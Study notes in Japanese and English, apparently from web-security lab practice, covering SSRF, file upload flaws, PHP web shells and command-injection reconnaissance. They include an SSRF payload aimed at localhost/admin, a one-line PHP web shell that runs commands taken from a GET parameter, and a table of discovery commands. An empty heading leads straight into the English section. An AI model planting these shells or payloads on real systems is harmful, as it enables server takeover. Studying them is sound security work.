## SSRF (Server-Side Request Forgery)

### 攻撃対象エンドポイント
```
POST /product/stock HTTP/1.0  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 118  
stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

### 攻撃例
内部リソースへのアクセスを試みる：
```
stockApi=http://localhost/admin
```

---

## ファイルアップロードの脆弱性

### Content-Disposition ヘッダー
アップロードされたファイルの情報を示す：
```
Content-Disposition: form-data; name="image"; filename="example.jpg"
```

### Content-Type の例
- `application/x-www-form-urlencoded`：テキストデータ
- `multipart/form-data`：画像やPDFなどのバイナリファイル
- `image/jpeg`, `image/png`：画像ファイル

### 不正なファイルタイプ検証
拡張子だけで判定すると、悪意あるファイルが通過する可能性あり。

---

## Web Shell の例

### ファイル読み取り
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

### コマンド実行
```php
<?php echo system($_GET['command']); ?>
```

### 実行例

# Useful Commands for OS Command Injection

After identifying an OS command injection vulnerability, it's useful to execute some initial commands to obtain information about the target system.

## 🖥️ Summary of Useful Commands

| Purpose of Command       | Linux Command     | Windows Command     |
|--------------------------|-------------------|---------------------|
| Name of current user     | `whoami`          | `whoami`            |
| Operating system         | `uname -a`        | `ver`               |
| Network configuration    | `ifconfig`        | `ipconfig /all`     |
| Network connections      | `netstat -an`     | `netstat -an`       |
| Running processes        | `ps -ef`          | `tasklist`          |


